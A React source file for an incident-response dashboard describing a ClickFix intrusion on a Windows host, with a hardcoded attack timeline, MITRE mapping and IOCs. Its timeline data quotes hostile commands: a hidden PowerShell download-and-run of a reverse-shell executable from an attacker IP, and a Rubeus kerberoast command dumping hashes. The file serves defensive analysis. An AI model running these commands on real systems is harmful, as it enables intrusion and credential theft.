import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { 
  Shield, 
  AlertTriangle, 
  Clock, 
  Server, 
  Users, 
  Terminal, 
  Network,
  FileText,
  Activity,
  ChevronRight,
  ChevronDown,
  Filter,
  Search,
  ExternalLink,
  Download,
  Share2,
  MoreHorizontal,
  Eye,
  Calendar,
  MapPin,
  Zap,
  Key,
  Target,
  Database,
  ArrowLeft,
  Bell,
  AlertCircle,
  CheckCircle,
  Play,
  Pause
} from 'lucide-react';

const ModernIncidentView = () => {
  const [markdown, setMarkdown] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedTimelineEvent, setSelectedTimelineEvent] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterSeverity, setFilterSeverity] = useState('all');
  const [expandedSections, setExpandedSections] = useState({
    timeline: true,
    technical: false,
    mitre: false
  });

  useEffect(() => {
    fetch('/incident/signal_analysis_2025_05_17_to_19.md')
      .then(res => {
        if (!res.ok) throw new Error(`Failed to load: ${res.status}`);
        return res.text();
      })
      .then(text => {
        setMarkdown(text);
        setIsLoading(false);
      })
      .catch(err => {
        console.error("Error:", err);
        setError(err.message);
        setIsLoading(false);
      });
  }, []);

  if (isLoading) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <div className="flex items-center space-x-3">
          <div className="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          <span className="text-slate-600 font-medium">Loading incident data...</span>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <div className="text-center p-8 bg-white rounded-lg shadow-sm border border-red-100">
          <AlertTriangle className="w-12 h-12 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-semibold text-slate-900 mb-2">Failed to load incident</h2>
          <p className="text-slate-600">Error: {error}</p>
        </div>
      </div>
    );
  }

  const incidentData = {
    id: "INC-2025-0517-001",
    title: "Multi-stage Attack on EC2AMAZ-OSH4IUQ",
    status: "Active Investigation",
    severity: "Critical",
    priority: "P0",
    assignee: "Security Team",
    created: "2025-05-17T15:16:40Z",
    lastUpdated: "2025-05-19T12:30:00Z",
    affectedSystems: ["EC2AMAZ-OSH4IUQ.corp.local"],
    affectedUsers: ["CORP\\jl.picard"],
    attackVector: "ClickFix Social Engineering",
    c2Server: "172.31.7.63:4444",
    timelineEvents: [
      {
        id: 1,
        time: "15:16:40 UTC",
        date: "May 17, 2025",
        type: "initial_access",
        title: "ClickFix Initial Access",
        description: "User jl.picard compromised through ClickFix social engineering",
        severity: "critical",
        entities: [
          { type: "user", value: "CORP\\jl.picard" },
          { type: "host", value: "EC2AMAZ-OSH4IUQ" },
          { type: "registry", value: "HKU\\S-1-5-21-216862292-1716178118-2570252875-1113\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList" }
        ],
        details: "PowerShell execution with evasion parameters detected. Command: \"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -nop -w hidden -c \"iwr http://172.31.7.63/revshelled.exe -OutFile $env:TEMP\\fixer.exe; Start-Process $env:TEMP\\fixer.exe\""
      },
      {
        id: 2,
        time: "15:16:43 UTC",
        date: "May 17, 2025",
        type: "c2_establishment",
        title: "C2 Connection Established",
        description: "Command & Control channel established to attacker infrastructure",
        severity: "critical",
        entities: [
          { type: "file", value: "C:\\Users\\jl.picard\\AppData\\Local\\Temp\\2\\fixer.exe" },
          { type: "ip", value: "172.31.7.63:4444" },
          { type: "protocol", value: "TCP" }
        ],
        details: "C2 connection from fixer.exe to 172.31.7.63:4444. Source IP: 172.31.5.238"
      },
      {
        id: 3,
        time: "15:16:55 UTC",
        date: "May 17, 2025",
        type: "persistence",
        title: "RMM Tool Deployment",
        description: "AnyDesk remote management tool deployed for persistence",
        severity: "high",
        entities: [
          { type: "file", value: "C:\\Windows\\Temp\\anydesk.exe" },
          { type: "process", value: "anydesk.exe" }
        ],
        details: "AnyDesk RMM tool deployed from Temp directory. Multiple configuration files created in user's AppData directory."
      },
      {
        id: 4,
        time: "15:17:00 UTC",
        date: "May 17, 2025",
        type: "process_injection",
        title: "Process Injection Detected",
        description: "Malicious code injected into legitimate processes",
        severity: "high",
        entities: [
          { type: "process", value: "fixer.exe" },
          { type: "process", value: "anydesk.exe" },
          { type: "access_mask", value: "0x1fffff" }
        ],
        details: "Source: C:\\Users\\JL025C~1.PIC\\AppData\\Local\\Temp\\2\\fixer.exe injected into C:\\Windows\\Temp\\anydesk.exe with suspicious access patterns."
      },
      {
        id: 5,
        time: "15:18:15 UTC",
        date: "May 17, 2025",
        type: "credential_theft",
        title: "Credential Theft Attempt",
        description: "Rubeus tool used for Kerberos ticket extraction",
        severity: "critical",
        entities: [
          { type: "tool", value: "Rubeus.exe" },
          { type: "technique", value: "Kerberoast" },
          { type: "file", value: "C:\\Windows\\Temp\\hashes.txt" }
        ],
        details: "Command: C:\\Windows\\Temp\\Rubeus.exe -a kerberoast /outputfile:C:\\Windows\\Temp\\hashes.txt"
      },
      {
        id: 6,
        time: "15:22:53 UTC",
        date: "May 17, 2025",
        type: "discovery",
        title: "Active Directory Enumeration",
        description: "BloodHound/SharpHound used for AD reconnaissance",
        severity: "high",
        entities: [
          { type: "tool", value: "BloodHound/SharpHound" },
          { type: "technique", value: "Fileless execution" },
          { type: "target", value: "Active Directory" }
        ],
        details: "PowerShell memory-based execution (fileless technique). Active Directory collection methods identified with multiple encoded PowerShell script blocks."
      }
    ]
  };

  const getSeverityColor = (severity) => {
    const colors = {
      critical: "bg-red-50 text-red-700 border-red-200",
      high: "bg-orange-50 text-orange-700 border-orange-200",
      medium: "bg-yellow-50 text-yellow-700 border-yellow-200",
      low: "bg-blue-50 text-blue-700 border-blue-200"
    };
    return colors[severity] || colors.medium;
  };

  const getSeverityBadgeColor = (severity) => {
    const colors = {
      critical: "bg-red-100 text-red-800",
      high: "bg-orange-100 text-orange-800",
      medium: "bg-yellow-100 text-yellow-800",
      low: "bg-blue-100 text-blue-800"
    };
    return colors[severity] || colors.medium;
  };

  const getEventIcon = (type) => {
    const icons = {
      initial_access: Target,
      c2_establishment: Network,
      persistence: Database,
      process_injection: Zap,
      credential_theft: Key,
      discovery: Eye
    };
    return icons[type] || Activity;
  };

  const getEntityIcon = (type) => {
    const icons = {
      user: Users,
      host: Server,
      file: FileText,
      process: Terminal,
      ip: Network,
      tool: Terminal,
      technique: Zap,
      registry: Database,
      protocol: Network,
      access_mask: Key,
      target: Target
    };
    return icons[type] || FileText;
  };

  const toggleSection = (section) => {
    setExpandedSections(prev => ({
      ...prev,
      [section]: !prev[section]
    }));
  };

  // Filter timeline events based on search and severity
  const filteredEvents = incidentData.timelineEvents.filter(event => {
    const matchesSearch = event.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         event.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         event.details.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesSeverity = filterSeverity === 'all' || event.severity === filterSeverity;
    return matchesSearch && matchesSeverity;
  });

  return (
    <div className="min-h-screen bg-slate-50">
      {/* Header */}
      <div className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Link 
                to="/" 
                className="flex items-center text-slate-500 hover:text-slate-700 transition-colors"
              >
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back
              </Link>
              <div className="h-6 w-px bg-slate-200"></div>
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-red-100 rounded-lg flex items-center justify-center">
                  <Shield className="w-5 h-5 text-red-600" />
                </div>
                <div>
                  <h1 className="text-xl font-semibold text-slate-900">{incidentData.title}</h1>
                  <p className="text-sm text-slate-600">{incidentData.id}</p>
                </div>
              </div>
            </div>
            
            <div className="flex items-center space-x-3">
              <div className="flex items-center space-x-2">
                <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                <span className="text-sm text-slate-600">Live Investigation</span>
              </div>
              <span className={`px-3 py-1.5 rounded-full text-sm font-medium border ${getSeverityColor(incidentData.severity.toLowerCase())}`}>
                {incidentData.severity}
              </span>
              <div className="flex items-center space-x-2">
                <button className="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition-colors">
                  <Bell className="w-5 h-5" />
                </button>
                <button className="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition-colors">
                  <Share2 className="w-5 h-5" />
                </button>
                <button className="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition-colors">
                  <Download className="w-5 h-5" />
                </button>
                <button className="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-lg transition-colors">
                  <MoreHorizontal className="w-5 h-5" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="grid grid-cols-12 gap-6">
          {/* Main Content */}
          <div className="col-span-12 lg:col-span-8 space-y-6">
            {/* Overview Cards */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <div className="bg-white rounded-lg border border-slate-200 p-6 hover:shadow-md transition-shadow">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-slate-600">Status</span>
                  <Activity className="w-4 h-4 text-green-500" />
                </div>
                <p className="text-lg font-semibold text-slate-900">{incidentData.status}</p>
                <p className="text-xs text-slate-500 mt-1">Under active investigation</p>
              </div>
              
              <div className="bg-white rounded-lg border border-slate-200 p-6 hover:shadow-md transition-shadow">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-slate-600">Affected Systems</span>
                  <Server className="w-4 h-4 text-blue-500" />
                </div>
                <p className="text-lg font-semibold text-slate-900">{incidentData.affectedSystems.length}</p>
                <p className="text-xs text-slate-500 mt-1 truncate">{incidentData.affectedSystems[0]}</p>
              </div>
              
              <div className="bg-white rounded-lg border border-slate-200 p-6 hover:shadow-md transition-shadow">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-slate-600">Attack Vector</span>
                  <Target className="w-4 h-4 text-red-500" />
                </div>
                <p className="text-lg font-semibold text-slate-900">ClickFix</p>
                <p className="text-xs text-slate-500 mt-1">Social Engineering</p>
              </div>

              <div className="bg-white rounded-lg border border-slate-200 p-6 hover:shadow-md transition-shadow">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-slate-600">Timeline Events</span>
                  <Clock className="w-4 h-4 text-purple-500" />
                </div>
                <p className="text-lg font-semibold text-slate-900">{incidentData.timelineEvents.length}</p>
                <p className="text-xs text-slate-500 mt-1">Over 3 days</p>
              </div>
            </div>

            {/* Search and Filter Controls */}
            <div className="bg-white rounded-lg border border-slate-200 p-4">
              <div className="flex items-center space-x-4">
                <div className="flex-1 relative">
                  <Search className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                  <input
                    type="text"
                    placeholder="Search timeline events..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 border border-slate-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
                <div className="flex items-center space-x-2">
                  <Filter className="w-4 h-4 text-slate-400" />
                  <select
                    value={filterSeverity}
                    onChange={(e) => setFilterSeverity(e.target.value)}
                    className="px-3 py-2 border border-slate-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  >
                    <option value="all">All Severity</option>
                    <option value="critical">Critical</option>
                    <option value="high">High</option>
                    <option value="medium">Medium</option>
                    <option value="low">Low</option>
                  </select>
                </div>
                <div className="text-sm text-slate-500">
                  {filteredEvents.length} of {incidentData.timelineEvents.length} events
                </div>
              </div>
            </div>

            {/* Timeline */}
            <div className="bg-white rounded-lg border border-slate-200 shadow-sm">
              <div className="p-6 border-b border-slate-200">
                <button
                  onClick={() => toggleSection('timeline')}
                  className="flex items-center justify-between w-full text-left"
                >
                  <h2 className="text-lg font-semibold text-slate-900">Attack Timeline</h2>
                  {expandedSections.timeline ? (
                    <ChevronDown className="w-5 h-5 text-slate-400" />
                  ) : (
                    <ChevronRight className="w-5 h-5 text-slate-400" />
                  )}
                </button>
              </div>
              
              {expandedSections.timeline && (
                <div className="p-6">
                  <div className="space-y-6">
                    {filteredEvents.map((event, index) => {
                      const EventIcon = getEventIcon(event.type);
                      return (
                        <div key={event.id} className="relative group">
                          {index < filteredEvents.length - 1 && (
                            <div className="absolute left-6 top-12 h-6 w-px bg-slate-200 group-hover:bg-slate-300 transition-colors"></div>
                          )}
                          
                          <div className="flex items-start space-x-4">
                            <div className={`w-12 h-12 rounded-lg flex items-center justify-center ${getSeverityColor(event.severity)} border-2 group-hover:scale-105 transition-transform`}>
                              <EventIcon className="w-5 h-5" />
                            </div>
                            
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center justify-between mb-2">
                                <h3 className="text-base font-semibold text-slate-900 group-hover:text-blue-600 transition-colors">{event.title}</h3>
                                <div className="flex items-center space-x-3">
                                  <span className={`px-2 py-0.5 rounded text-xs font-medium ${getSeverityBadgeColor(event.severity)}`}>
                                    {event.severity.toUpperCase()}
                                  </span>
                                  <div className="flex items-center space-x-2 text-sm text-slate-500">
                                    <Clock className="w-4 h-4" />
                                    <span>{event.time}</span>
                                  </div>
                                </div>
                              </div>
                              
                              <p className="text-slate-600 mb-3">{event.description}</p>
                              
                              {event.entities && (
                                <div className="flex flex-wrap gap-2 mb-3">
                                  {event.entities.map((entity, idx) => {
                                    const EntityIcon = getEntityIcon(entity.type);
                                    return (
                                      <span
                                        key={idx}
                                        className="inline-flex items-center px-2.5 py-1 rounded-md text-xs font-medium bg-slate-100 text-slate-700 border border-slate-200 hover:bg-slate-200 transition-colors cursor-pointer"
                                        title={`${entity.type}: ${entity.value}`}
                                      >
                                        <EntityIcon className="w-3 h-3 mr-1.5" />
                                        {entity.value.length > 30 ? `${entity.value.substring(0, 30)}...` : entity.value}
                                      </span>
                                    );
                                  })}
                                </div>
                              )}
                              
                              <button
                                onClick={() => setSelectedTimelineEvent(selectedTimelineEvent === event.id ? null : event.id)}
                                className="text-sm text-blue-600 hover:text-blue-700 font-medium flex items-center space-x-1"
                              >
                                {selectedTimelineEvent === event.id ? (
                                  <>
                                    <ChevronDown className="w-4 h-4" />
                                    <span>Hide details</span>
                                  </>
                                ) : (
                                  <>
                                    <ChevronRight className="w-4 h-4" />
                                    <span>Show details</span>
                                  </>
                                )}
                              </button>
                              
                              {selectedTimelineEvent === event.id && (
                                <div className="mt-3 p-4 bg-slate-50 rounded-lg border border-slate-200 animate-in slide-in-from-top-2 duration-200">
                                  <h4 className="text-sm font-medium text-slate-900 mb-2">Technical Details</h4>
                                  <p className="text-sm text-slate-700 font-mono leading-relaxed whitespace-pre-wrap">
                                    {event.details}
                                  </p>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}
            </div>

            {/* MITRE ATT&CK Mapping */}
            <div className="bg-white rounded-lg border border-slate-200 shadow-sm">
              <div className="p-6 border-b border-slate-200">
                <button
                  onClick={() => toggleSection('mitre')}
                  className="flex items-center justify-between w-full text-left"
                >
                  <h2 className="text-lg font-semibold text-slate-900">MITRE ATT&CK Mapping</h2>
                  {expandedSections.mitre ? (
                    <ChevronDown className="w-5 h-5 text-slate-400" />
                  ) : (
                    <ChevronRight className="w-5 h-5 text-slate-400" />
                  )}
                </button>
              </div>
              
              {expandedSections.mitre && (
                <div className="p-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {[
                      { tactic: "Initial Access", technique: "T1204.002", description: "User Execution: Malicious File", color: "red" },
                      { tactic: "Execution", technique: "T1059.001", description: "PowerShell", color: "orange" },
                      { tactic: "Defense Evasion", technique: "T1055", description: "Process Injection", color: "yellow" },
                      { tactic: "Persistence", technique: "T1547.001", description: "Registry Run Keys", color: "green" },
                      { tactic: "Command & Control", technique: "T1219", description: "Remote Access Software", color: "blue" },
                      { tactic: "Credential Access", technique: "T1558", description: "Steal Kerberos Tickets", color: "purple" }
                    ].map((item, index) => (
                      <div key={index} className="p-4 border border-slate-200 rounded-lg hover:shadow-md transition-shadow cursor-pointer group">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm font-medium text-slate-900 group-hover:text-blue-600 transition-colors">{item.tactic}</span>
                          <span className="text-xs text-slate-500 font-mono bg-slate-100 px-2 py-1 rounded">{item.technique}</span>
                        </div>
                        <p className="text-sm text-slate-600">{item.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Sidebar */}
          <div className="col-span-12 lg:col-span-4 space-y-6">
            {/* Live Status Banner */}
            <div className="bg-gradient-to-r from-red-50 to-orange-50 border border-red-200 rounded-lg p-4">
              <div className="flex items-center space-x-3">
                <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
                <div>
                  <p className="text-sm font-medium text-red-800">Active Threat</p>
                  <p className="text-xs text-red-600">Investigation ongoing - Last update 2 min ago</p>
                </div>
              </div>
            </div>

            {/* Incident Details */}
            <div className="bg-white rounded-lg border border-slate-200 p-6">
              <h3 className="text-base font-semibold text-slate-900 mb-4">Incident Details</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-slate-600">Priority</label>
                  <div className="flex items-center space-x-2 mt-1">
                    <span className="px-2 py-1 bg-red-100 text-red-800 text-xs font-medium rounded-full">{incidentData.priority}</span>
                    <span className="text-sm text-slate-900">Immediate Response Required</span>
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-600">Assignee</label>
                  <div className="flex items-center space-x-2 mt-1">
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                      <Users className="w-3 h-3 text-white" />
                    </div>
                    <span className="text-sm text-slate-900">{incidentData.assignee}</span>
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-600">Created</label>
                  <p className="text-sm text-slate-900 mt-1">
                    {new Date(incidentData.created).toLocaleDateString()} {new Date(incidentData.created).toLocaleTimeString()}
                  </p>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-600">Last Updated</label>
                  <p className="text-sm text-slate-900 mt-1">
                    {new Date(incidentData.lastUpdated).toLocaleDateString()} {new Date(incidentData.lastUpdated).toLocaleTimeString()}
                  </p>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-600">Duration</label>
                  <p className="text-sm text-slate-900 mt-1">72+ hours (ongoing)</p>
                </div>
              </div>
            </div>

            {/* Affected Assets */}
            <div className="bg-white rounded-lg border border-slate-200 p-6">
              <h3 className="text-base font-semibold text-slate-900 mb-4">Affected Assets</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-slate-600">Hosts ({incidentData.affectedSystems.length})</label>
                  <div className="mt-2 space-y-2">
                    {incidentData.affectedSystems.map((system, index) => (
                      <div key={index} className="flex items-center justify-between p-2 bg-slate-50 rounded-lg">
                        <div className="flex items-center space-x-2">
                          <Server className="w-4 h-4 text-red-500" />
                          <span className="text-sm font-mono text-slate-900">{system.split('.')[0]}</span>
                        </div>
                        <span className="px-2 py-0.5 bg-red-100 text-red-700 text-xs rounded">Compromised</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-slate-600">Users ({incidentData.affectedUsers.length})</label>
                  <div className="mt-2 space-y-2">
                    {incidentData.affectedUsers.map((user, index) => (
                      <div key={index} className="flex items-center justify-between p-2 bg-slate-50 rounded-lg">
                        <div className="flex items-center space-x-2">
                          <Users className="w-4 h-4 text-orange-500" />
                          <span className="text-sm font-mono text-slate-900">{user}</span>
                        </div>
                        <span className="px-2 py-0.5 bg-orange-100 text-orange-700 text-xs rounded">At Risk</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* IOCs (Indicators of Compromise) */}
            <div className="bg-white rounded-lg border border-slate-200 p-6">
              <h3 className="text-base font-semibold text-slate-900 mb-4">Key IOCs</h3>
              <div className="space-y-3">
                <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                  <div className="flex items-center space-x-2 mb-1">
                    <Network className="w-4 h-4 text-red-600" />
                    <span className="text-sm font-medium text-red-800">C2 Server</span>
                  </div>
                  <p className="text-sm font-mono text-slate-700">{incidentData.c2Server}</p>
                </div>
                <div className="p-3 bg-orange-50 border border-orange-200 rounded-lg">
                  <div className="flex items-center space-x-2 mb-1">
                    <FileText className="w-4 h-4 text-orange-600" />
                    <span className="text-sm font-medium text-orange-800">Malware</span>
                  </div>
                  <p className="text-sm font-mono text-slate-700">fixer.exe (revshelled.exe)</p>
                </div>
                <div className="p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                  <div className="flex items-center space-x-2 mb-1">
                    <Terminal className="w-4 h-4 text-yellow-600" />
                    <span className="text-sm font-medium text-yellow-800">Tool</span>
                  </div>
                  <p className="text-sm font-mono text-slate-700">Rubeus.exe, AnyDesk</p>
                </div>
              </div>
            </div>

            {/* Quick Actions */}
            <div className="bg-white rounded-lg border border-slate-200 p-6">
              <h3 className="text-base font-semibold text-slate-900 mb-4">Response Actions</h3>
              <div className="space-y-2">
                <button className="w-full flex items-center justify-between px-3 py-3 text-sm text-white bg-red-600 hover:bg-red-700 rounded-lg transition-colors font-medium">
                  <span>🚨 Isolate affected hosts</span>
                  <ExternalLink className="w-4 h-4" />
                </button>
                <button className="w-full flex items-center justify-between px-3 py-2 text-sm text-slate-700 hover:bg-slate-50 rounded-lg transition-colors">
                  <span>🔑 Reset user credentials</span>
                  <ExternalLink className="w-4 h-4" />
                </button>
                <button className="w-full flex items-center justify-between px-3 py-2 text-sm text-slate-700 hover:bg-slate-50 rounded-lg transition-colors">
                  <span>🛡️ Block C2 infrastructure</span>
                  <ExternalLink className="w-4 h-4" />
                </button>
                <button className="w-full flex items-center justify-between px-3 py-2 text-sm text-slate-700 hover:bg-slate-50 rounded-lg transition-colors">
                  <span>📋 Export IOCs</span>
                  <Download className="w-4 h-4" />
                </button>
                <button className="w-full flex items-center justify-between px-3 py-2 text-sm text-slate-700 hover:bg-slate-50 rounded-lg transition-colors">
                  <span>📧 Notify stakeholders</span>
                  <ExternalLink className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Risk Score */}
            <div className="bg-white rounded-lg border border-slate-200 p-6">
              <h3 className="text-base font-semibold text-slate-900 mb-4">Risk Assessment</h3>
              <div className="space-y-4">
                <div>
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-sm font-medium text-slate-600">Overall Risk Score</span>
                    <span className="text-lg font-bold text-red-600">9.5/10</span>
                  </div>
                  <div className="w-full bg-slate-200 rounded-full h-2">
                    <div className="bg-red-500 h-2 rounded-full animate-pulse" style={{ width: '95%' }}></div>
                  </div>
                  <p className="text-xs text-slate-500 mt-1">Critical - Immediate action required</p>
                </div>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div className="text-center p-2 bg-red-50 rounded-lg">
                    <span className="text-xs text-slate-600 block">Severity</span>
                    <span className="font-semibold text-red-700">Critical</span>
                  </div>
                  <div className="text-center p-2 bg-orange-50 rounded-lg">
                    <span className="text-xs text-slate-600 block">Scope</span>
                    <span className="font-semibold text-orange-700">High</span>
                  </div>
                  <div className="text-center p-2 bg-red-50 rounded-lg">
                    <span className="text-xs text-slate-600 block">Impact</span>
                    <span className="font-semibold text-red-700">Critical</span>
                  </div>
                  <div className="text-center p-2 bg-green-50 rounded-lg">
                    <span className="text-xs text-slate-600 block">Confidence</span>
                    <span className="font-semibold text-green-700">High</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ModernIncidentView; 